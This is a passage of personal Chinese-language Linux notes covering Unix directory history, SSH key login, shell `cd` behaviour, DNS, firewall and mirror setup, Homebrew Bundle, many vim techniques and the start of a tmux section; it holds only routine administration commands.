Ritchie在小型机PDP-7上发明了Unix。1971年，他们将主机升级到了PDP-11。当时，他们使用一种叫做RK05的储存盘，一盘的容量大约是1.5MB。没过多久，操作系统（根目录）变得越来越大，一块盘已经装不下了。于是，他们加上了第二盘RK05，并且规定第一块盘专门放系统程序，第二块盘专门放用户自己的程序，因此挂载的目录点取名为/usr。也就是说，根目录\"/\"挂载在第一块盘，\"/usr\"目录挂载在第二块盘。除此之外，两块盘的目录结构完全相同，第一块盘的目录（/bin, /sbin, /lib, /tmp...）都在/usr目录下重新出现一次。\n后来，第二块盘也满了，他们只好又加了第三盘RK05，挂载的目录点取名为/home，并且规定/usr用于存放用户的程序，/home用于存放用户的数据。\n从此，这种目录结构就延续了下来。随着硬盘容量越来越大，各个目录的含义进一步得到明确。\n- /：存放系统程序，也就是At&t开发的Unix程序。\n- /usr：存放Unix系统商（比如IBM和HP）开发的程序。\n- /usr/local：存放用户自己安装的程序。\n- /opt：在某些系统，用于存放第三方厂商开发的程序，所以取名为option，意为\"选装\"。\n\n# windows配置免密码登录linux\n1. windows配置ssh\n这个我是很久之前安装的了.就是百度一下windows安装openssh即可.然后跟着教程走一波,安装完openssh\n2. 生成公钥\n```\nssh-keygen\n```\n生成公钥的位置\n  \n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213613.png)\n\n就是这个文件.在ssh/下.这个是公钥.id_rsa是私钥.我们只需要公钥.\n\n3. 发送公钥到linux\n```bash\nscp ./id_rsa.pub root@192.168.xxx.xxx:~/.ssh/windows_ras.pub\n```\nscp是个命令,第一个参数是当前要发送的文件,root是linux用户名@后接IP.然后冒号后接这个文件要存放的位置\n这样就发送过去了.\n\n4. 配置Linux\ncd ~/.ssh #进入到ssh目录.这个目录注意.我们是链接root所以这个家目录应该是root\ntouch authorized_keys\n新建文件用来存放公钥,如果你已经有这个文件了.继续往下追加即可\n然后将你的windows公钥追加到这个文件中即可\n\n5. 重启ssh服务\nservice sshd restart  //重启ssh服务\n\n6. 连接\n配置ssh免密钥登录之前如果没有登录过服务器，则第一次使用ssh免密钥登录时，会出现如下情况\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213631.png)\n\n输入yes即可，以后使用ssh免密钥登录就不会出现这种情况了\n\n# 关于shell脚本中执行cd命令无效的分析\n## 缘起：\n我在shell中写cd目录为什么不会到我想去的目录中? \nshell脚本中使用cd命令进入到指定目录后，然后执行该目录下的命令，在执行shell脚本后发现不能进入到指定目录中，因而后续命令会因为找不到而报错？\n\n## 例子：\n编写shell脚本test.sh\n```bash\n#!/bin/sh\ncd Tools/vmware-tools-distrib\npwd\n```\n\n在Terminal中执行./test.sh，结果如下：\n```bash\nsoaringlee@ubuntu:~/Desktop$ ./test.sh \n/home/soaringlee/Desktop/Tools/vmware-tools-distrib\nsoaringlee@ubuntu:~/Desktop$ \n```\n因而并没有进入到指定目录中。\n\n在Terminal中执行source test.sh，结果如下：\n```bash\nsoaringlee@ubuntu:~/Desktop$ source test.sh \n/home/soaringlee/Desktop/Tools/vmware-tools-distrib\nsoaringlee@ubuntu:~/Desktop/Tools/vmware-tools-distrib$ \n```\n因此采用source命令执行该脚本，进入到了指定目录中。\n采用点命令运行该脚本，也可以实现进入到指定目录中。\n```bash\nsoaringlee@ubuntu:~/Desktop$ . test.sh\n/home/soaringlee/Desktop/Tools/vmware-tools-distrib\nsoaringlee@ubuntu:~/Desktop/Tools/vmware-tools-distrib$\n```\n\n## 原因：\n采用第一种方法是直接运行该脚本，会创建一个子shell，并在子shell中逐个执行脚本中的指令； 而子shell从父shell中继承了环境变量，但是执行后不会改变父shell的环境变量；可以这样理解：在子shell中的操作和环境变量不会影响父进程，在执行完shell后又回到了父进程。\n采用第二种方法运行该脚本，source命令是在当前shell环境下执行该脚本，不会创建子shell，因而可以在shell中进入到指定目录中。\nsource命令又称为点命令，因为source命名可用 . 来代替作用：在当前shell环境下读取并执行脚本中的命令，通常用于重新执行刚修改过的初始化文件，使之立即生效，而不必注销并登录。\n\n\n# 设置DNS\n常用DNS提供商\n`114.114.114.114 / 114.114.115.115`这款国内的 DNS 有着访问速度快，以及稳定的好名声，而且在各省都有服务器\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213648.png)\n\nlinux查看DNS一般位于/etc/resolv.conf文件中\n\n## Ubuntu\n安装好Ubuntu之后设置了静态IP地址，再重启后就无法解析域名。想重新设置一下DNS，打开/etc/resolv.conf\n```\ncat /etc/resolv.conf\n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n```\n内容是一段警告：说这个文件是resolvconf程序动态创建的，不要直接手动编辑，修改将被覆盖。\n果不其然，修改后重启就失效了，搜索了Ubuntu下设置DNS的相关资料，总结出两个办法：\n\n### 方法一\n通过/etc/network/interfaces，在它的最后增加一句：\n\n```\ndns-nameservers 8.8.8.8\n```\n\n8.8.8.8是Google提供的DNS服务，这里只是举一个例子，你也可以改成电信运营商的DNS。重启后DNS就生效了，这时候再看/etc/resolv.conf，最下面就多了一行：\n```\n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\nnameserver 8.8.8.8\n```\n### 方法二\n通过修改：/etc/resolvconf/resolv.conf.d/base（这个文件默认是空的）\n\n在里面插入：\n```\nnameserver 8.8.8.8\nnameserver 8.8.4.4\n```\n\n如果有多个DNS就一行一个\n修改好保存，然后执行\n```\nresolvconf -u\n```\n再看/etc/resolv.conf，最下面就多了2行：\n```\n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\nnameserver 8.8.8.8\nnameserver 8.8.4.4\n```\n可以看到我们的设置已经加上了，然后再ping一个域名，当时就可以解析了，无需重启。\n\n## CentOS\n直接修改/etc/resolv.conf，内容是：\n```\nnameserver 8.8.8.8\nnameserver 8.8.4.4\n```\n保存就生效了，重启也没问题。\n\n# 关闭防火墙\n**在centos中**\n以下命令是在centos中的\n- service iptables stop   关闭防火墙\n- chkconfig iptables off  禁止防火墙开机自启\n- service iptables status 查看防火墙的状态\n\n**Ubuntu中**\n-\tufw disable 关闭ubuntu的防火墙\n- ufw enable 开启防火墙\n\n**kali中**\n```\napt-get install ufw\n# 如果安装失败就替换一下apt-get的源\nufw disable\n```\n\n# 设置固定ip\n1. 修改/etc/network/interfaces文件\n在终端输入命令：vim  /etc/network/interfaces，修改文件的内容如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213701.png)\n\n2. 修改/etc/resolv.conf文件\n在终端输入命令：vim /etc/resolv.conf，向其中修改如下的内容：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213715.png)\n\n3. 重启网络服务\n```\nsystemctl restart networking\n```\n\n# 设置root用户初始密码\n## ubuntu\n1、ubuntu都是以普通用户安装的，如果你刚安装设置root用户是不允许的。\n2、出于安全考虑，默认时Ubuntu的root用户时没有固定密码的，它的密码是随机产生并且动态改变的。\n那么：\n如何知道新安装的ubuntu默认root密码是多少呢？\n既然默认root密码是随机的，即每次开机都有一个新的root密码。我们只需要修改默认root密码即可！\n我们可以在终端输入命令 sudo passwd，然后再输入root用户的密码。\n```\nsudo passwd ：修改root密码\n```\n\n# 修改安装源为国内镜像源\n## ubuntu\n1. 原文件备份\n```bash\nsudo cp /etc/apt/sources.list /etc/apt/sources.list.bak\n```\n2. 编辑源列表文件\n```bash\nsudo vim /etc/apt/sources.list\n```\n3. 将原来的列表删除，添加如下内容（中科大镜像源）\n```text\ndeb http://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse\ndeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse\ndeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse\ndeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse\ndeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse\ndeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse\ndeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse\ndeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse\ndeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse\ndeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse\n```\n4. 运行sudo apt-get update\n\n## kali\n```\nvim /etc/apt/sources.list\n```\n```\n#中科大\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n#阿里云\ndeb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n#清华大学\ndeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n```\n4. 运行sudo apt-get update\n\n# dotfiles\n[~/.dotfiles in 100 Seconds](https://www.youtube.com/watch?v=r_MpUP6aKiQ)\n\n## Manage all your installed software at one place with Homebrew Bundle\nIn software development, you often manage all your dependencies through a package manager like NPM or NuGet. When it comes to software on our operating systems, we often break with this concept and install software from all various places like App Stores, Websites and more. Homebrew Bundle takes back control.\n\nIf you regularly install software on your Mac or Linux machine, that does not come via the official App Stores, you might be familiar with Homebrew, a package manager for operating systems. With the Homebrew Bundle extension, we can even define a list of all installed software in a Brewfile file.\n\n### Generate a Brewfile\nA good starting point is to dump all currently via Homebrew installed software into a new Brewfile file.\n```\nbrew bundle dump --describe\n```\n\nWithin such a Brewfile, you can define a mix of application sources:\n- `brew` for regular Homebrew command-line apps\n- `cask` for desktop applications\n- `mas` for Apple App Store applications\nHere is a (shortened) example of some my configuration.\n```\ntap \"homebrew/bundle\"\ntap \"homebrew/cask\", \"https://mirrors.ustc.edu.cn/homebrew-cask.git\"\ntap \"homebrew/core\", \"https://mirrors.ustc.edu.cn/homebrew-core.git\"\ntap \"homebrew/services\", \"https://gitee.com/cunkai/homebrew-services.git\"\n# Interpreted, interactive, object-oriented programming language\nbrew \"python@3.9\"\n# Core application library for C\nbrew \"glib\"\n# Cross-platform make\nbrew \"cmake\"\n# Toolkit for image loading and pixel buffer manipulation\nbrew \"gdk-pixbuf\"\n# GIF image/animation creator/editor\nbrew \"gifsicle\"\n# Open source programming language to build simple/reliable/efficient software\nbrew \"go\"\n# Image loading and rendering library\nbrew \"imlib2\"\n# Library for a binary-based efficient data interchange format\nbrew \"msgpack\"\n# Open source relational database management system\nbrew \"mysql\", restart_service: true\n# Ambitious Vim-fork focused on extensibility and agility\nbrew \"neovim\"\n# Display and control your Android device\nbrew \"scrcpy\"\n# Code-search similar to ack\nbrew \"the_silver_searcher\"\n# Terminal multiplexer\nbrew \"tmux\"\n# Display directories as trees (with optional color/HTML output)\nbrew \"tree\"\n# Full TeX Live distribution without GUI applications\ncask \"mactex-no-gui\"\n```\n\n### Install all packages from a Brewfile\nHomebrew Bundle works like every other package manager. To install the listed applications or bring them all to the latest version, you just call the following command.\n```\nbrew bundle --file ~/my-folder/Brewfile\n```\n\n# vim\n## vim命令的组成\nvim中命令是由`重复次数 + 命令 + 范围`组成的。\n\n## 文本对象\nvim中的文本对象可以分为3大类：paragraphs、sentences、words\n\n### paragraphs\n每一段以空行分隔\n\n### sentences\n以`[.|？|!][<Space>|<Enter>|<Tab>]`结尾，算一句\n\n### words\n在vim中words分为2种，分别是`小词`、`大词`：\n- `小词`: 小词分为如下三种\n    - 第一种小词：连在一起的字符 只有`字母`、`_` 的词，例如`aaa`、`aaa_aaa`都是一个小词\n    - 第二种小词：连在一起的字符 只有`汉字`的词，例如`发发发`、`番窠倒臼番窠倒臼`都是一个小词\n    - 第三种小词：连在一起的字符 不包含`字母`、`_`、`汉字`与`空格` 的词， 例如`[]`、`{}`都是一个小词\n    - 实战：`{ab_dd}`可以拆分为3个小词，分别是`{`、`ab_dd`、`}`； `{ab&dc}`可以拆分为5个小词，分别是`{`、`ab`、`&`、`dc`、`}`；`{ab否&dd}`可以拆分为6个小词，分别是`{`、`ab`、`否`、`&`、`dd`、`}`\n- `大词`：连在一起字符 不包含`空格` 的词， 例如`fkdjfk_d&**方法*^^**`是一个大词\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131430.png)\n\n\n## 在vim中直接执行linux命令\n- `:!cmd`: 不退出vim 执行命令 cmd\n- `:r !cmd`: 不退出vim执行命令cmd,并将cmd的输出内容插入当前文本中。\n- `:shell`: 切换到shell里（此时并没有退出vim，可以理解成vim转入后台），你可以在shell中做任何操作，退出shell（比如用exit）后，会切换回原来的vim中\n\n## 信息查看\n- `:messages`: 命令可以查看以前给出的消息\n\n## 命令总结\n| 单字母 | 是否作为某命令的前缀 | 类型 | 作用| 在可视块模式中 | 执行完后是否进入插入模式 |  \n|--|--|--|--|--|--|\n|w|否|移动|将光标移动到当前光标后的第二个小词的开头处|一样|否|\n|W|否|移动|将光标移动到当前光标后的第二个大词的开头处|一样|否|\n|e|否|移动|将光标移动到当前光标后的第一个小词的末尾处|一样|否|\n|E|否|移动|将光标移动到当前光标后的第一个大词的末尾处|一样|否|\n|b|否|移动|将光标移动到当前光标前的第一个小词的开头处|一样|否|\n|B|否|移动|将光标移动到当前光标前的第一个大词的开头处|一样|否|\n|ge|否|移动|将光标移动到当前光标前的第二个小词的末尾处|一样|否|\n|gE|否|移动|将光标移动到当前光标前的第二个大词的末尾处|一样|否|\n|$|否|移动|将光标移动到当前行的最后一个字符（包括空格）|一样|否|\n|0|否|移动|将光标移动到当前行的第一个字符（包括空格）|一样|否|\n|^|否|移动|将光标移动到当前行的第一个字符（不包括空格）|一样|否|\n|H|否|移动|将光标移动到本页顶部|一样|否|\n|M|否|移动|将光标移动到本页中部|一样|否|\n|L|否|移动|将光标移动到本页底部|一样|否|\n|{|否|移动|将光标移动到上一个空行处|一样|否|\n|}|否|移动|将光标移动到下一个空行处|一样|否|\n|(|否|移动|将光标移动到上一句开头处|一样|否|\n|)|否|移动|将光标移动到下一句开头处|一样|否|\n|gi|否|移动|将光标移动到最后一次变成插入模式的地方|一样|是|\n|d|是|删除|后接范围来进行删除|删除可视化部分|否|\n|D|否|删除|删除当前光标后的所有字符|删除可视化部分的所有行|否|\n|c|是|删除|后接范围来进行删除|删除可视化部分|是|\n|C|否|删除|删除当前光标后的所有字符|删除可视化部分的所有行|是|\n|s|否|删除|删除当前光标处的字符|删除可视化部分|是|\n|S|否|删除|删除当前行|删除可视化部分的所有行|是|\n|x|否|删除|删除当前光标处的字符|删除可视化部分|否|\n|X|否|删除|删除当前光标处的前一个字符|删除可视化部分的所有行|否|\n\n\n移动命令技巧：\n- 如果你想要到达后面某个词处或后面某个词的开头，则使用w或W\n- 如果你想到达后面某个单词的末尾处，则使用e或E\n- 如果你想要到达前面某个词处或前面某个词的开头，则使用b或B\n- 如果你想要到达前面某个词的末尾处，则使用ge或gE\n\n### 可视模式\n- gv: 重选上次的高亮选区:\n- o: 切换高亮选区的活动端\n\n## 跳转命令\n### jump list\n每跳过一下vim都会把你跳过的位置存入jump list中。我们可以使用`Ctrl-o`来跳转到上一个位置, 使用`Ctrl-i`来跳转到下一个位置\n\n原理：jump list相当于与一个队列，有一个指针指向当前是位于jump list到什么位置, 如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325204708.png)\n\n表示上一个位置是第7行，上上个位置是第6行。当使用2次`Ctrl-o`后，jump list如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325204908.png)\n\n此时使用1次`Ctrl-i`后，jump list如下:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325205030.png)\n\n此时再使用2次`Ctrl-o`后，jump list如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325205135.png)\n\n此时若使用跳转命令gg的话，会将跳转后的位置存入jump list的尾部，而不是当前指向的位置的后面，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325205344.png)\n\n#### change list\n每修改一次代码，vim都会把你修改的位置存入change list中。我们可以使用`g;`来跳转到上一个修改的地方，使用`g,`来跳转到下一个修改的地方\n\n原理：与jump list一样\n\n假如现在change list如下:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325210209.png)\n\n当使用2次`g;`后，change list如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325210326.png)\n\n此时使用1次`g,`后，change list如下:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325210357.png)\n\n此时再使用2次`g;`后，change list如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325210525.png)\n\n此时若使用`r`命令将当前字符进行替换的话，会将此修改的位置存入change list的尾部，而不是当前指向的位置的后面，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220325210718.png)\n\n#### 其他\n- `'.`: 跳转到最后一次编辑的地方\n- `.^`: 跳转到最后一次退出插入模式的地方\n\n### 搜索\n- `*`: 向下 全字匹配\n- `#`: 向上 全字匹配\n- `g*`: 向下 普通匹配\n- `g#`: 向上 普通匹配\n\n```\n:s/Ubuntu/Debian/g\n```\n当前行替换\n\n```\n:%s/<search_term>/<replace_term>/g\n```\n全文替换\n\n```\n:'<,'>s/<search_term>/<replace_term>/g\n```\n可视化模式下替换\n\n## .操作\n`.`表示重复该操作: 上次普通模式进入插入模式的操作 到 进入这次普通模式的操作\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220415205707.png)\n\n## normal命令\nVim normal命令的使用形式为`:{range}norm[al][!] {commands}`，表示在 `{range}`指定的范围内的每行执行若干普通模式命令 `{commands}`。若未指定，则表示在当前行执行命令。`{commands}` 不能以空格开始，除非在空格前面加个计数 1。\n\n例如:\n- `:normal ggdd` 会将光标移动到文件的第一行( gg) 并删除它( dd )\n- `:%normal A;` %代表整个文件范围，在每行的结尾添加一个分号\n- `:%normal i//` 在每行的开头添加//\n\n### 避免vim映射\nnormal命令中的可选参数`!` 用于指示vim在当前命令中不使用任何vim映射；如果没有显式使用 `!` 选项，即便是执行一个非递归映射 (noremap) 命令，它的参数仍有可能被重新映射。\n\n例如，假设已经设置了vim映射 `:nnoremap G dd`，则在vim普通模式按下 `G` 将执行命令 `dd`，即会删除一整行；此时，若在vim命令行模式下执行命令 `:normal G` 同样将删除当前行而不会跳转到当前文件的末行。\n\n为了在即便 `G` 命令已经被设置了映射的条件下也能在vim `normal`命令中不改变 `G` 命令原始的含义，需要使用 `:normal! G`。通过 `!` 选项显式指示Vim在当前命令中不使用任何vim映射。\n\n### 配合.使用\n假设想在某个文件的一系列行尾添加一个分号`;`，使用vim重复操作命令 `.` 当然可以完成这一任务。但是如果想对100行内容执行末尾加分号的操作，如果使用 `.` 命令，则需要按100次 `j.`，这显然不是一个好的方法。\n\n为了完成上述任务，vim教程网介绍一种使用 normal 命令执行 `.` 命令的新方法。\n\n首先使用命令 `A;` 在光标所在当前行末尾增加 `;`, 然后按 `j` 跳到下一行末尾后按 `V` 进入vim块选择可视化模式，然后按 `G` 跳转到文件尾行，从而完成目标行的选择, 最后，在vim命令行模式下执行命令 `:'<,'>normal .`\n\n`:'<,'>normal .` 命令可以解读为 对高亮选区中的每一行 执行普通模式下的 `.` 命令。无论是操作 100 行还是 1000 行文本，这种方法都能高效地完成任务，而且在可视模式中选中这些行可以摆脱计数的负担。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/691e0c29gy1fv6131ex74g20j40bqjtz.gif)\n\n注：`'<,'>` 代表高亮选区的范围。在可视化模式下选择完范围后，如果按下 `:` 键，vim命令行上就会自动填充 `:'<,'>`\n\n### 配合宏使用\n假设希望将以下文本内容的每个行编号修改为单括号，并将首个单词首字母大小。\n\n转换成vim下的操作就是：需要将每行首个 . 字符修改成 )，再将下一个单词的首字母变为大写。\n```\n6. six\n7. seven\n8. eight\n// break up the monotony\n9. nine\n10. ten\n```\n\n为了高效地实现上述文本转换，首先，在vim普通模式下录制宏 `qa0f.r)w~q`，然后按键 `jVG` 选择操作区域后，再执行命令 `:'<,'>normal @a` 即可完成任务。\n\n`:normal @a` 命令指示 Vim 在高亮选区中的每一行上执行保存在寄存器a中的宏内容。虽然宏操作在第 4 行会被中断 (`f.`没有在该行找到目标字符 `.`)，但并不会影响后续行上宏的执行。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/691e0c29gy1fv6137yhw2g20ja08r76k.gif)\n\n### normal命令下的<C-O>作用\n`:%normal A;^OI#`: 其中`^O`是按了`<C-O>`出现的字符，表示回到普通模式。这行命令的作用是在普通模式下按`A;`, 由于按了`A`, 所以此时是插入模式，然后通过`<C-O>`即`^O`回到普通模式下，再按`I#`\n\n## 寄存器\n常见文本编辑器都会提供剪切板来支持复制粘贴，Vim 也不例外。 不同的是 Vim 提供了 10 类共 48 个寄存器，提供无与伦比的寄存功能。 最常用到的是匿名寄存器(`\"0`)，因为它默认只会存储 `y` 操作拷贝的内容。\n\n一般来讲，可以用 `\"{register}y` 来拷贝到 `{register}` 中， 用 `\"{register}p` 来粘贴 `{register}` 中的内容。例如： `\"ayy` 可以拷贝当前行到寄存器 `a` 中，而 `\"ap` 则可以粘贴寄存器 `a` 中的内容。\n\n在 Vim 中可通过 :reg 来查看每个寄存器当前的值。\n\n## 配置文件\n### 用Alt键来映射\n这次在用Vim的时候，想设置以下快捷键，但是Alt+key（`<A+key>`)的设置一直不成功，后来在网上找了一下资料才明白原来将\"`<A+key>`\"的输入格式欢畅\"^[key\"就可以了，输入方式为：按下 Crtl+v后在按下 esc ，再按下key（你想设置的键），这样vim中显示为：^[key, 这样就搞定了……\n　注：这种方式再gvim、idea中不行，再gvim中直接使用\\<M-key>或\\<A-key>\n\n### vim中json文件中双引号隐藏问题\n在vim中如果json文件中的双引号被隐藏了， 这是因为你将vim中的`conceallevel`设置成了2\n可以通过如下代码来查看`conceallevel`的值最后是由谁修改的\n```\n:verbose set conceallevel\n```\n> 注： verbose命令可以让你看到是谁最后修改了conceallevel\n一般`conceallevel`被设置成2是由`indentline`插件造成的， 所以上面的命令行输出结果可能如下：\n```\nconceallevel=2\n    Last set from ~/.vim/plugged/indentLine/after/plugin/indentLine.vim\n```\n这表明确实是由`indentline`插件造成的\n所以你可以通过在`.vimrc`文件中添加如下代码来解决：\n```\nlet g:indentLine_conceallevel = 0\n```\n但是当期设置为0时， 将不会显示缩进线；\n所以最好的办法时：在编辑json文件时设置为0，而编译其他文件文件时设置为2\n```vim\nautocmd FileType json,markdown let g:indentLine_conceallevel=0\nautocmd FileType javascript,python,c,cpp,java,vim,shell let g:indentLine_conceallevel=2\n```\n\n### 键映射中nore含义\n默认的map就是递归的\n\n递归的映射。其实很好理解，也就是如果键a被映射成了b，c又被映射成了a，如果映射是递归的，那么c就被映射成了b。\n```\n:map a b\n:map c a\n```\n对于c效果等同于\n```\n:map c b\n\n```\n如果是 nore 的映射，即非递归映射，按下 c 只等于按 a。\n\n## ex命令之g命令\nVim's global (`:h :g` for more info) command is a useful tool to quickly perform Ex command within the file you're currently editing (some common example of Ex commands are: `d` (delete), `t` (copy), `s` (substitute), `m` (move), etc). Used properly, it can save you a lot of time typing.\n\n`g` follows the syntax:\n```\n:[range]g[lobal]/{pattern}/[cmd]\n```\nHere I will cover basic, slightly more advanced, and advanced use cases. If this is your first time using `g`, you don't have to follow the advanced one yet, feel free to come back later after getting more experience with it. Learning Vim takes a lot of muscle memories. I am still learning new something new about Vim all the time! 🤓\n\n### When to use it?\n\nAnytime you find yourself repeating the same Ex command in one file, you should start thinking, \"How can I do this in one stroke with `:g`?\"\n\n### Basic use cases\n\nLet's start with basic use cases, going to more sophisticated ones.\n\nSuppose you have a file with many \"const\" and you need to delete them all:\n```\nconst hello = \"world\";\nconst foo = \"bar\";\nconst baz = \"qux\";\n// and many more const...\n```\nRun :g/const/d and they are gone!\n\nWhat just happened?\n\nWe gave `g` a pattern: `\"const\"` string. It found all lines (`g` is line-based) that matches the pattern. It performed `d` (deletion) to those matches.\n\n`g` by default will perform `p` (print) if no command is passed. Try it: `:g/const/.`\n\nIt also accepts ranges. Let's say you want to get rid of all empty lines between lines 10 and 20. You can do this by:\n```\n:10,20g/^$/d\n```\nNote: `^$` is a regex pattern for blank lines.\n\n### Slightly more advanced use cases\n\nLet's move on to more fancy use cases.\n\nSuppose you have the following and want to reverse the line order:\n```\nconst one = 1;\nconst two = 2;\nconst three = 3;\nconst four = 4;\n```\nTo do that with :g, you can do:\n\n```\n:global/^/m 0\n```\n\nWe'd get:\n\n```\nconst four = 4;\nconst three = 3;\nconst two = 2;\nconst one = 1;\n```\n\nPretty cool, but how did it work?\n\n`m 0` moves (see `:h :m` for details) a line into target line number (line 0). If you want to do it yourself manually, you can go to line 1, run :m 0, then go to next line, run `:m 0`, then next line, run `:m 0`, etc. You'll notice the lines are gradually being put on top of the latest one. The difference is, `g` does it for you in one move. (btw, `^` is a pattern for beginning of line; here it selects all lines in a file).\n\nPretty cool! 😎\n\nYou can combine `g` with substitute (`s`):\n\n```\ngood, bad, ugly\nyou're so good it's bad\nnothing bad here\n```\n\nIf we want to substitute all \"bad\"s into \"nice\", but only on the lines that contain \"good\", we can do:\n\n```\n:g/good/s/bad/nice/g\n```\n\nWe'd get:\n\n```\ngood, nice, ugly\nyou're so good it's nice\nnothing bad here\n```\n\n### Advanced use cases\n\n`g` can be used with macros. The syntax is :\n\n```\n:g/keyword/norm! @q\n```\n\nLet's say we have a the following:\n\n```\nimport lib1\nimport lib2\n\nconst something = 'else';\n\nimport lib3\n// ...and many more imports\n```\nOur tasks are:\n1. wrap all libs with {}\n2. capitalize the l in lib\n\nWe can create macro to do our tasks. But we don't want to execute our macro on lines not containing `import`. Does that mean we have to apply our macros individually on each line we want to do it on?\n\nWell, with `g`, we can select to apply our macros only to lines containing \"import\"! Imagine the time saving if you have to do it on 100+ lines!\n\nAssuming we have vim-surround installed (for quick brackets wrap), here's how we can do it!\n\n- Record a macro to do tasks 1 and 2. With our cursor on \"i\" in `import lib1`, run:\n```\nqq0w~ysiw{q\n// qq = record macro in q register\n// 0 = go to beginning of line\n// w = jump one word\n// ~ = capitalize letter under cursor\n// ysiw{ = vim-surround: add {} around lib1\n// q = exit recording\n```\n- Undo the changes so our line is back to our original state: `import lib1`\n- Now execute the macro on only lines containing \"import\" with :g!\n```\n:g/import/norm! @q\n```\nAnd there you have it:\n```\nimport { Lib1 }\nimport { Lib2 }\n\nconst something = 'else';\n\nimport { Lib3 }\n// and more...\n```\n\n## vim正则表达式\n毋庸多言，在vim中正则表达式得到了十分广泛的应用。 最常用的`/` 和 `:s` 命令中，正则表达式都是不可或缺的。 下面对vim中的正则表达式的一些难点进行说明。\n\n### 关于magic\nvim中有个magic的设定。设定方法为：\n```\n:set magic \" 设置magic \n:set nomagic \" 取消magic\n```\n\nvim毕竟是个编辑器，正则表达式中包含的大量元字符如果原封不动地引用（像perl 那样）， 势必会给不懂正则表达式的人造成麻烦，比如 `/foo(1)` 命令， 大多数人都用它来查找`foo(1)`这个字符串， 但如果按照正则表达式来解释，被查找的对象就成了`foo1` 了。\n\n于是，vim就规定，正则表达式的元字符必须用反斜杠进行转义才行， 如上面的例子，如果确实要用正则表达式，就应当写成 `/foo\\(1\\)` 。 但是，像 `.` `*` 这种极其常用的元字符，都加上反斜杠就太麻烦了。 而且，众口难调，有些人喜欢用正则表达式，有些人不喜欢用……\n\n为了解决这个问题，vim设置了 `magic` 这个东西。简单地说， magic就是设置哪些元字符要加反斜杠哪些不用加的。 简单来说：\n\n- `magic (\\m)`：除了 `$` `.` `*` `^` 之外其他元字符都要加反斜杠。\n- `nomagic (\\M)`：除了 `$` `^` 之外其他元字符都要加反斜杠。\n\n这个设置也可以在正则表达式中通过 `\\m` `\\M` 开关临时切换。 \n- `\\m` 后面的正则表达式会按照 `magic` 处理\n- `\\M` 后面的正则表达式按照 nomagic 处理， 而忽略实际的magic设置。\n\n\n例如：\n- `/\\m.*` # 查找任意字符串\n- `/\\M.*` # 查找字符串 `.*` （点号后面跟个星号）\n\n另外还有更强大的 `\\v` 和 `\\V`。\n- `\\v` （即 `very magic` 之意）：任何元字符都不用加反斜杠\n- `\\V` （即 `very nomagic` 之意）：任何元字符都必须加反斜杠\n\n例如：\n- `/\\v(a.c){3}$` # 查找行尾的`abcaccadc`\n- `/\\m(a.c){3}$` # 查找行尾的`(abc){3}`\n- `/\\M(a.c){3}$` # 查找行尾的`(a.c){3}`\n- `/\\V(a.c){3}$` # 查找任意位置的`(a.c){3}$`\n\n默认设置是 magic，vim也推荐大家都使用magic的设置，在有特殊需要时，直接通过 `\\v\\m\\M\\V` 即可。\n\n## 搜索替换中的&\n在搜索替换中&前面匹配到的内容，如下例子:\n\n```\nabcdef\n```\n对于以上文本，使用`:s/abc/&123`后，内容会变成如下：\n```\nabc123def\n```\n\n# tmux\n## 会话管理\n### 新建会话\n第一个启动的 Tmux 窗口，编号是`0`，第二个窗口的编号是`1`，以此类推。这些窗口对应的会话，就是 0 号会话、1 号会话。\n使用编号区分会话，不太直观，更好的方法是为会话起名。\n```\n$ tmux new -s <session-name>\n```\n上面命令新建一个指定名称的会话。\n\n### 分离会话\n在 Tmux 窗口中，按下`Ctrl+b d`或者输入`tmux detach`命令，就会将当前会话与窗口分离。\n```\n$ tmux detach\n```\n上面命令执行后，就会退出当前 Tmux 